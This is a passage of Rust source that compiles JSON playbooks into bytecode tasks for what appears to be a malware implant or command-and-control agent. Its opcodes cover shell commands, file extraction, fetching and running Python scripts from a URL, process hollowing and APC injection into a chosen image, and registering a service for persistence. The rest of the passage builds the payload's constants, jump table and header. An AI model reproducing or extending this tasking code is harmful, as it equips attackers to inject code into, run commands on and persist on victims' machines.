            let shell_args = task.get("args").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(shell_args, false)?)?);
        }

        "shell_extract" => {
            // Args: [path:bytes]
            args.push(encode_arg(&parse_arg_value(require_str(task, "path")?, false)?)?);
        }

        "pyexec" => {
            // Args: [url:bytes][script:bytes]
            let default_str = Value::String(String::new());
            let url = task.get("url").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(url, false)?)?);
            let script = task.get("script").unwrap_or(&default_str);
            args.push(encode_arg(&parse_arg_value(script, false)?)?);
        }

        "hollow" | "hollow_apc" => {
            // Args: [image:bytes][task_id:u8][search:bytes?]
            let image = require_str(task, "image")?;
            args.push(encode_arg(&parse_arg_value(image, false)?)?);
            let task_id = require_u64(task, "task_id")? as u8;
            args.push(encode_arg(&ParsedArg { data: vec![task_id], is_var_ref: false, is_const_ref: false })?);
            if let Some(search) = task.get("search") {
                args.push(encode_arg(&parse_arg_value(search, false)?)?);
            }
        }

        "register_service" => {
            // Args: [service_name:bytes]
            // Accept "name" as alias for "service_name"
            let svc = task.get("service_name").or_else(|| task.get("name"))
                .ok_or_else(|| "op=register_service: missing required field 'service_name'".to_string())?;
            if svc.as_str().map(|s| s.is_empty()).unwrap_or(false) {
                return Err("op=register_service: field 'service_name' cannot be empty".to_string());
            }
            args.push(encode_arg(&parse_arg_value(svc, false)?)?);
        }

        "exit_process" => {
            // Args: [exit_code:u32]
            let exit_code = get_u64(task, "exit_code", 0) as u32;
            args.push(encode_arg(&ParsedArg {
                data: exit_code.to_le_bytes().to_vec(),
                is_var_ref: false,
                is_const_ref: false,
            })?);
        }

        _ => {
            // Unknown opcode - no args
        }
    }

    // Build task bytecode: [opcode][arg_count][args...]
    let mut result = vec![opcode, args.len() as u8];
    for arg in args {
        result.extend(arg);
    }

    Ok(result)
}

/// Compile a task set to bytecode
fn compile_task_set(tasks: &[Value]) -> Result<Vec<u8>, String> {
    let mut result = Vec::new();
    for task in tasks {
        result.extend(compile_task(task)?);
    }
    result.push(0x00); // End opcode
    Ok(result)
}

/// Main compilation function - translates a JSON playbook to bytecode
pub fn compile(data: &Value) -> Result<Vec<u8>, String> {
    // Parse constants
    let mut constants: Vec<Vec<u8>> = Vec::new();
    if let Some(consts) = data.get("constants").and_then(|v| v.as_array()) {
        for c in consts {
            constants.push(parse_constant(c)?);
        }
    }

    // Compile task sets
    let mut task_sets: BTreeMap<u8, Vec<u8>> = BTreeMap::new();
    if let Some(sets) = data.get("task_sets").and_then(|v| v.as_object()) {
        for (id_str, task_data) in sets {
            let task_id: u8 = id_str.parse().map_err(|e| format!("Bad task set id: {}", e))?;
            let tasks = if let Some(obj) = task_data.as_object() {
                obj.get("tasks")
                    .and_then(|v| v.as_array())
                    .map(|v| v.as_slice())
                    .unwrap_or(&[])
            } else if let Some(arr) = task_data.as_array() {
                arr.as_slice()
            } else {
                &[]
            };
            task_sets.insert(task_id, compile_task_set(tasks)?);
        }
    }

    // Build constants section
    let mut constants_section = vec![constants.len() as u8];
    for c in &constants {
        constants_section.extend(&(c.len() as u32).to_le_bytes());
        constants_section.extend(c);
    }

    // Calculate offsets for jump table
    // Header: version(1) + size(4) = 5 bytes
    let jump_table_start = 5 + constants_section.len();
    let jump_table_size = 1 + (3 * task_sets.len()); // num_entries + (task_id + offset) * n

    // Calculate task set offsets
    let task_set_start = jump_table_start + jump_table_size;
    let mut offsets: BTreeMap<u8, u16> = BTreeMap::new();
    let mut current_offset = task_set_start;
    for (task_id, bytecode) in &task_sets {
        offsets.insert(*task_id, (current_offset - 5) as u16);
        current_offset += bytecode.len();
    }

    // Build jump table
    let mut jump_table = vec![task_sets.len() as u8];
    for (task_id, offset) in &offsets {
        jump_table.push(*task_id);
        jump_table.extend(&offset.to_le_bytes());
    }

    // Build task sets section
    let mut task_sets_section = Vec::new();
    for (_, bytecode) in &task_sets {
        task_sets_section.extend(bytecode);
    }

    // Calculate total size
    let total_size = 5 + constants_section.len() + jump_table.len() + task_sets_section.len();

    // Build final bytecode
    let mut result = vec![0x01]; // Version
    result.extend(&(total_size as u32).to_le_bytes());
    result.extend(&constants_section);
    result.extend(&jump_table);
    result.extend(&task_sets_section);

    Ok(result)
}
